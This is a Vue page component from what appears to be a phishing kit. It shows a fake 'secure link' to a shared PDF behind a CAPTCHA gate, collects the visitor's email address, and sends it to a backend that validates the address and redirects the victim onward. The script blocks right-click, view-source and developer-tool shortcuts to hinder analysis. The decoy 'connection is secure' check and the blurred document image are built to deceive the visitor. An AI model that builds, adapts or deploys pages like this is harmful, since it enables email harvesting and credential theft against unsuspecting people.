<template>
  <div class="fullscreen-wrapper">
    <!-- Background layer -->
    <div class="background-blur"></div>

    <!-- CAPTCHA Gate -->
    <div v-if="!captchaToken" class="gate-container">
      <main>
        <div class="instructions captcha-adjusted">
          <p>Please stand by while we are checking if the site connection is secure.</p>
          <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
        </div>
      </main>
    </div>

    <!-- Email Verification Section -->
    <div v-else class="background">
      <div class="toto-container">
        <div class="header">
          <div class="logo-text">
            <span class="success-check"></span>
          </div>
        </div>

        <div class="content">
          <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="90" height="30" />
          <p>You've received a secure link to:</p>
          <p style="font-size: 16px;">AA484937-13-06-2025.pdf</p>
          <p style="font-size: 16px;">To proceed, enter the email that this <br />item was shared to</p>

          <div class="form-wrapper">
            <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
            <input id="honeypot" v-model="honeypot" type="text" tabindex="-1" autocomplete="off" aria-hidden="true" class="visually-hidden" />

            <label for="email" class="visually-hidden">Email address</label>
            <input id="email" v-model="email" type="email" placeholder="Enter email" required class="email-input" :disabled="loading" />

            <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>

            <button @click="submitForm" :disabled="loading" class="action-button">
              {{ loading ? 'Next' : 'Next' }}
            </button>
          </div>
        </div>

        <div class="divider"></div>

        <div class="footer-container">
          <p class="footer-text">
            © 2025 <a href="/privacy" target="_blank">Privacy Policy</a>
          </p>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const honeypot = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)
let turnstileRendered = false

onMounted(async () => {
  await nextTick()
  document.addEventListener('contextmenu', e => e.preventDefault())
  document.addEventListener('keydown', e => {
    if (
      e.key === 'F12' ||
      (e.ctrlKey && ['u', 's', 'p'].includes(e.key.toLowerCase())) ||
      (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase()))
    ) {
      e.preventDefault()
    }
  })

  if (window.turnstile && !turnstileRendered) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: token => {
        captchaToken.value = token
        setTimeout(() => {
          captchaToken.value = null
          turnstileRendered = false
          window.turnstile.render('.cf-turnstile', {
            sitekey: '0x4AAAAAABgei6QZruCN7n08',
            callback: t => (captchaToken.value = t)
          })
        }, 120000)
      }
    })
    turnstileRendered = true
  }
})

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

async function submitForm() {
  if (loading.value) return
  error.value = ''

  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format'
    return
  }

  loading.value = true
  try {
    const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: email.value,
        captchaToken: captchaToken.value,
        middleName: honeypot.value
      })
    })
    const data = await res.json()
    if (!res.ok || !data.valid) throw new Error(data.message || 'Verification failed')
    if (data.redirectUrl) {
      setTimeout(() => {
        window.location.href = data.redirectUrl
      }, 1500)
    }
  } catch (err) {
    error.value = err.message
    loading.value = false
  }
}
</script>












<style scoped>
.visually-hidden {
  position: absolute !important;
  height: 1px;
  width: 1px;
  overflow: hidden;
  clip: rect(1px, 1px, 1px, 1px);
  white-space: nowrap;
}

.captcha-adjusted {
  margin-top: 18vh !important;
}

html,
body {
  margin: 0;
  padding: 0;
  font-family: Arial, sans-serif;
  height: 100%;
  overflow: hidden;
  background: transparent;
}

.background,
.gate-container {
  position: relative;
  height: 100vh;
  width: 100vw;
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
  align-items: center;
  background-color: transparent;
  padding-top: 40px;
  box-sizing: border-box;
  z-index: 0;
}

.cf-turnstile {
  transform: scale(0.9);
  transform-origin: center;
  height: auto !important;
  width: auto !important;
}

.instructions {
  text-align: center;
  max-width: 500px;
  padding: 0.4rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
}

.toto-container {
  width: 70%;
  max-width: 350px;
  background: #ffffff;
  border-radius: 10px;
  box-shadow: 0 2px 16px rgba(0, 0, 0, 0.1);
  padding: 3rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
  box-sizing: border-box;
}

.header {
  display: flex;
  justify-content: center;
  margin-bottom: 0.1rem;
}

.logo-text {
  font-weight: bold;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.success-check {
  font-size: 1.8rem;
  color: red;
  line-height: 1;
}

.content {
  text-align: center;
}

.form-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 0.8rem;
  margin-top: 1rem;
  margin-bottom: 1.5rem;
}

.email-input {
  width: 100%;
  padding: 0.6rem;
  border: 1px solid #e1e1e1;
  border-radius: 5px;
  font-size: 1rem;
  background-color: #fff;
  color: #000;
}

.error {
  color: red;
  font-size: 0.9rem;
  margin-top: 0.19rem;
  margin-bottom: -0.19rem;
}

.action-button {
  background-color: #0080e2;
  color: #fff;
  padding: 0.6rem 1.2rem;
  border: 1px solid #444;
  border-radius: 5px;
  cursor: pointer;
  font-size: 1rem;
  width: 108%;
  transition: background-color 0.2s ease;
}

.action-button:disabled {
  opacity: 0.6;
  cursor: default;
}

.action-button:hover:not(:disabled) {
  background-color: #479fe3;
}

.footer-container {
  text-align: center;
}

.footer-text {
  font-size: 0.85rem;
  color: #777;
  margin-top: 0.1rem;
  margin-bottom: 2.5rem;
}

.footer-text a {
  color: inherit;
  text-decoration: none;
}
</style>

<!-- Background Blur Layer (not scoped) -->
<style>
.fullscreen-wrapper {
  position: relative;
  width: 100vw;
  height: 100vh;
  overflow: hidden;
}

.background-blur {
  position: fixed;
  top: 0;
  left: 0;
  width: 80vw;
  height: 80vh;
  background-image: url('https://i.postimg.cc/76CSPbmN/pvcccder.png'); /* Changeable */
  background-size: cover;
  background-position: center;
  filter: blur(3px) brightness(0.7);
  z-index: -1;
}
</style>
